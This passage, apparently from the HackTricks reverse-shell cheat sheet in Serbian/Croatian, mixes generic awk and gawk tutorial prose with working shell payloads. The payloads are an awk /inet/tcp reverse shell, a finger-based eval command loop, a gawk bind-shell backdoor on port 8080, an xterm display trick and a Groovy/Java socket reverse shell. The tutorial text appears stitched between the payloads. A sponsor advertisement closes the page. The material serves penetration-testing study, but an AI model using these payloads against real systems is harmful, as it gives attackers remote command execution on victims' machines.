### Osnovna sintaksa

Osnovna sintaksa Awk-a je:

```bash
awk 'pattern { action }' file
```

- `pattern` predstavlja uslov koji se primenjuje na svaki red datoteke.
- `action` predstavlja akciju koja se izvršava kada se uslov zadovolji.
- `file` je ime datoteke koju želite da obradite.

### Primeri upotrebe

Evo nekoliko primera kako možete koristiti Awk:

1. Ispisivanje određenih redova datoteke:

```bash
awk 'NR==2,NR==5' file.txt
```

Ovaj primer će ispisati redove 2 do 5 iz datoteke `file.txt`.

2. Ispisivanje određenih kolona datoteke:

```bash
awk '{print $1, $3}' file.txt
```

Ovaj primer će ispisati prvu i treću kolonu iz datoteke `file.txt`.

3. Računanje sume vrednosti u određenoj koloni:

```bash
awk '{sum += $1} END {print sum}' file.txt
```

Ovaj primer će izračunati sumu vrednosti u prvoj koloni datoteke `file.txt` i ispisati rezultat.

### Napredne funkcionalnosti

Awk takođe pruža napredne funkcionalnosti kao što su rad sa regularnim izrazima, definisanje varijabli i korišćenje ugrađenih funkcija. Ove funkcionalnosti omogućavaju korisnicima da izvrše složenije operacije nad tekstualnim datotekama.

### Zaključak

Awk je moćan alat za obradu teksta koji omogućava korisnicima da manipulišu i analiziraju tekstualne datoteke na efikasan način. Razumevanje osnovne sintakse i naprednih funkcionalnosti Awk-a može biti od velike koristi prilikom obrade podataka u Linux okruženju.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Napadač
```bash
while true; do nc -l 79; done
```
Da biste poslali komandu, zapišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)

**Žrtva**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk (GNU Awk) je moćan alat za obradu teksta koji se često koristi u Linux okruženju. Ovaj alat omogućava manipulaciju i obradu teksta na različite načine, kao što su filtriranje, pretraživanje, izdvajanje i transformacija podataka.

Gawk koristi skriptni jezik koji je baziran na Awk jeziku, ali sa dodatnim funkcionalnostima i poboljšanjima. Skripte napisane u Gawk-u se izvršavaju liniju po liniju, čime se omogućava efikasna obrada velikih količina podataka.

Gawk se često koristi u kombinaciji sa drugim alatima i komandama u Linux okruženju, kao što su grep, sed i sort. Ova kombinacija alata omogućava naprednu obradu i analizu teksta, što je korisno u različitim scenarijima, kao što su log analiza, obrada CSV fajlova i generisanje izveštaja.

Evo nekoliko osnovnih komandi koje se često koriste u Gawk-u:

- `awk '{print $1}' file.txt` - Ispisuje prvu kolonu svakog reda iz datoteke `file.txt`.
- `awk '/pattern/{print $0}' file.txt` - Ispisuje sve redove koji sadrže određeni uzorak iz datoteke `file.txt`.
- `awk '{sum += $1} END {print sum}' file.txt` - Izračunava zbir prvih kolona svih redova iz datoteke `file.txt` i ispisuje rezultat.

Gawk je moćan alat koji pruža fleksibilnost i efikasnost u obradi teksta. Njegova upotreba može biti od velike pomoći u različitim situacijama, posebno kada je potrebno manipulisati i analizirati velike količine podataka.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Ovo će pokušati da se poveže sa vašim sistemom na portu 6001:
```bash
xterm -display 10.0.0.1:1
```
Da biste uhvatili obrnutu ljusku, možete koristiti (koja će slušati na portu 6001):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverse shell takođe radi za Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Reference
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage prijetnji, pronalazi probleme u cijelom vašem tehnološkom skupu, od API-ja do web aplikacija i oblak sustava. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakiranje AWS-a od nule do heroja s</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite vidjeti **oglašavanje vaše tvrtke u HackTricks-u** ili **preuzeti HackTricks u PDF-u**, provjerite [**PLANOVE PRETPLATE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**službeni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podijelite svoje trikove hakiranja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorije.

</details>
